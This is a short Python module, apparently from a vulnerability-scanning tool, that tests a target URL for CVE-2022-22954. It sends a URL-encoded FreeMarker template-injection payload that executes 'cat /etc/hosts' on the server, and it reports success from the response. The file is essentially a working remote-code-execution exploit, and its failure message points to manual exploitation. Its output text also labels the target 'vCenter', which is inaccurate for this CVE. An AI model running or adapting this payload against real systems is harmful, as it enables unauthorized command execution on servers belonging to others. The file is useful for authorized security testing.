import requests
from utils.output import *

class cve_2022_22954_check:

    def __init__(self, url_text, result_text, update_date):
        _url = str(url_text.text())
        if _url.endswith("/"):
            self.url = _url[:-1]
        else:
            self.url = _url
        print(self.url)
        self.result_text = result_text
        self.update_date = update_date
        if self.url == "":
            self.update_date.emit(output_format("ERROR", "What's your url?"))

    def check(self):
        # try:
        vuln_url = f"{self.url}/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d"
        resp = requests.get(vuln_url, verify=False)
        if "Authorization context is not valid" in resp.content.decode() and resp.status_code == 400:
            self.update_date.emit(output_format("SUCCESS", "The vCenter system is vulnerable to CVE-2022-22954!"))
        else:
            self.update_date.emit(output_format("FAILED", "The vCenter system is not vulnerable to CVE-2022-22954.Please check the network then retry or attempt manual exploitation."))
        # except Exception as e:
        #     self.update_date.emit(output_format("FAILED", f"Please check the network then retry. Error message: {str(e)}"))